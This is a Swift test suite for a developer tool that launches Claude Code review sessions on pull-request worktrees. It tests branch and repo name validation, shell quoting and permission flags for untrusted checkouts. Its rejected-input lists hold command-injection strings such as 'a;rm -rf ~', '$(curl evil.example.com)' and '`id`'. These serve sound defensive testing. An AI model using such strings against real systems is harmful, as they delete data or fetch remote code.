import Foundation
import Testing
@testable import Workspace

@Suite struct SafetyTests {
    @Test(arguments: ["main", "feature/input-event-model", "you/fix-1.2", "release-2026.10", "a_b"])
    func safeBranches(_ name: String) {
        #expect(Safety.isSafeBranchName(name))
    }

    /// Fork authors choose branch names; anything that could be shell or git syntax is rejected.
    @Test(arguments: ["", "-delete", "a..b", "a//b", "a/", "/a", "a.lock", "a/.hidden", "x@{1}", "a b", "a;rm -rf ~",
                      "$(curl evil.example.com)", "`id`", "a\nb", "a'b", "a\"b", "naïve", "a|b", "a&b", "a>b", "end.",
                      String(repeating: "a", count: 201)])
    func unsafeBranches(_ name: String) {
        #expect(!Safety.isSafeBranchName(name))
    }

    @Test func repos() {
        #expect(Safety.isSafeRepo("example-org/web-console"))
        #expect(Safety.isSafeRepo("Example.Org/repo_1"))
        #expect(!Safety.isSafeRepo("example-org"))
        #expect(!Safety.isSafeRepo("a/b/c"))
        #expect(!Safety.isSafeRepo("../etc"))
        #expect(!Safety.isSafeRepo("org/-rf"))
        #expect(!Safety.isSafeRepo("org/re po"))
        #expect(!Safety.isSafeRepo("org/$(id)"))
    }

    @Test func shellQuoting() {
        #expect(Safety.shellQuote("/Users/me/My Projects") == "'/Users/me/My Projects'")
        #expect(Safety.shellQuote("it's") == #"'it'\''s'"#)
        #expect(Safety.shellQuote("$(id)") == "'$(id)'")
    }

    @Test func appleScriptEscaping() {
        #expect(Safety.appleScriptString(#"cd '/tmp' && echo "hi" \ ok"#) == #""cd '/tmp' && echo \"hi\" \\ ok""#)
    }

    @Test func remoteURLs() {
        #expect(RemoteURL.gitHubRepo("git@github.com:example-org/web-console.git") == "example-org/web-console")
        #expect(RemoteURL.gitHubRepo("https://github.com/example-org/web-console") == "example-org/web-console")
        #expect(RemoteURL.gitHubRepo("https://github.com/example-org/web-console.git/") == "example-org/web-console")
        #expect(RemoteURL.gitHubRepo("ssh://git@github.com/example-org/web-console.git") == "example-org/web-console")
        #expect(RemoteURL.gitHubRepo("https://gitlab.com/example-org/web-console.git") == nil)
        #expect(RemoteURL.gitHubRepo("git@github.com:example-org/web-console/extra.git") == nil)
        #expect(RemoteURL.gitHubRepo("/local/path/repo.git") == nil)
    }

    @Test func claudeCommandQuotesEverything() {
        let command = CommandBuilder.claudeCommand(path: "/Users/me/it's here", promptFile: "/tmp/p 1.txt", claude: "/Users/me/.local/bin/claude")
        #expect(command == #"cd '/Users/me/it'\''s here' && p=$(cat '/tmp/p 1.txt') && rm -f '/tmp/p 1.txt' && '/Users/me/.local/bin/claude' "$p""#)
    }

    @Test func untrustedCheckoutFlagsAreQuoted() {
        let command = CommandBuilder.claudeCommand(path: "/w", promptFile: "/p", claude: "/c", flags: CommandBuilder.untrustedCheckoutFlags)
        #expect(command == #"cd '/w' && p=$(cat '/p') && rm -f '/p' && '/c' '--setting-sources' 'user' '--permission-mode' 'plan' "$p""#)
    }

    @Test func reviewCommandReadsInstructionsFromAFileAndKeepsThePromptLast() {
        let flags = CommandBuilder.reviewOnlyFlags + CommandBuilder.untrustedReviewFlags + CommandBuilder.settingsFlags(file: "/f")
        let command = CommandBuilder.claudeCommand(path: "/w", promptFile: "/p", claude: "/c", flags: flags, systemPromptFile: "/s")
        #expect(command == #"cd '/w' && p=$(cat '/p') && rm -f '/p' && s=$(cat '/s') && rm -f '/s' && '/c' '--permission-mode' 'default' '--setting-sources' 'user' '--settings' '/f' '--append-system-prompt' "$s" "$p""#)
        #expect(!CommandBuilder.untrustedReviewFlags.contains("plan"))
        #expect(!command.contains("review-only"))
    }

    @Test func everyReviewSessionPinsThePermissionMode() {
        // A user setting such as defaultMode "auto" must not let a review run or post without asking.
        let flags = CommandBuilder.reviewOnlyFlags
        let index = try! #require(flags.firstIndex(of: "--permission-mode"))
        #expect(flags[index + 1] == "default")
        #expect(!flags.contains { $0.hasPrefix("--allowedTools") || $0.hasPrefix("--allowed-tools") })
        // Testing a PR means editing and running code, so review sessions do not disallow tools.
        #expect(!flags.contains { $0.hasPrefix("--disallowedTools") || $0.hasPrefix("--disallowed-tools") })
    }

    @Test func realisticReviewCommandFitsATerminalLine() {
        // A long but realistic worktree path and cache path, like the one that overflowed.
        let path = "/Users/someone-with-a-long-name/Projects/.review-worktrees/example-organization-some-repository-pr-12345"
        let cache = "/Users/someone-with-a-long-name/Library/Caches/Docket/prompts/prompt-620C403D-2D1E-41B6-AC81-271B32952CF5.txt"
        let settings = "/Users/someone-with-a-long-name/Library/Caches/Docket/settings/" + SessionSettings.fileName(for: Data("x".utf8))
        let flags = CommandBuilder.reviewOnlyFlags + CommandBuilder.untrustedReviewFlags + CommandBuilder.noMCPFlags + CommandBuilder.settingsFlags(file: settings)
        let command = CommandBuilder.claudeCommand(path: path, promptFile: cache, claude: "/Users/someone-with-a-long-name/.local/bin/claude",
                                                   flags: flags, systemPromptFile: cache)
        #expect(command.utf8.count < CommandBuilder.maxTerminalLine)
    }

    @Test func customTemplateSubstitutesInsideArguments() {
        let args = CommandBuilder.customArguments(template: "/usr/bin/open -na Ghostty --args --working-directory={path} -e {command}",
                                                  path: "/tmp/a b", command: "echo hi; rm x")
        #expect(args == ["/usr/bin/open", "-na", "Ghostty", "--args", "--working-directory=/tmp/a b", "-e", "echo hi; rm x"])
    }

    @Test func gitConfigRemotes() {
        let config = """
        [core]
        \trepositoryformatversion = 0
        [remote "origin"]
        \turl = git@github.com:example-org/web-console.git
        \tfetch = +refs/heads/*:refs/remotes/origin/*
        [remote "upstream"]
        \turl=https://github.com/upstream-org/web-console
        [branch "main"]
        \tremote = origin
        """
        let remotes = LocalRepoIndex.parseRemotes(config)
        #expect(remotes.map(\.0) == ["origin", "upstream"])
        #expect(remotes.map(\.1) == ["git@github.com:example-org/web-console.git", "https://github.com/upstream-org/web-console"])
    }
}

@Suite struct WorktreeListTests {
    @Test func parsesPorcelainAndSkipsMainTree() {
        let output = """
        worktree /work/web-console
        HEAD 1111111111111111111111111111111111111111
        branch refs/heads/main

        worktree /work/.review-worktrees/example-org-web-console-pr-12
        HEAD 2222222222222222222222222222222222222222
        detached

        worktree /work/feature-x
        HEAD 3333333333333333333333333333333333333333
        branch refs/heads/mchen/feature-x
        locked in use by another tool

        worktree /tmp/gone
        HEAD 4444444444444444444444444444444444444444
        branch refs/heads/old
        prunable gitdir file points to non-existent location

        """
        let list = LinkedWorktree.parse(porcelain: output)
        #expect(list.map(\.path) == ["/work/.review-worktrees/example-org-web-console-pr-12", "/work/feature-x", "/tmp/gone"])
        #expect(list[0].branch == nil && !list[0].isLocked)
        #expect(list[1].branch == "mchen/feature-x" && list[1].isLocked)
        #expect(list[2].isPrunable && list[2].head.hasPrefix("4444"))
    }

    @Test func emptySessionCommandHasNoPrompt() {
        let command = CommandBuilder.claudeCommand(path: "/w", promptFile: nil, claude: "/c", flags: ["--permission-mode", "plan"])
        #expect(command == "cd '/w' && '/c' '--permission-mode' 'plan'")
    }
}
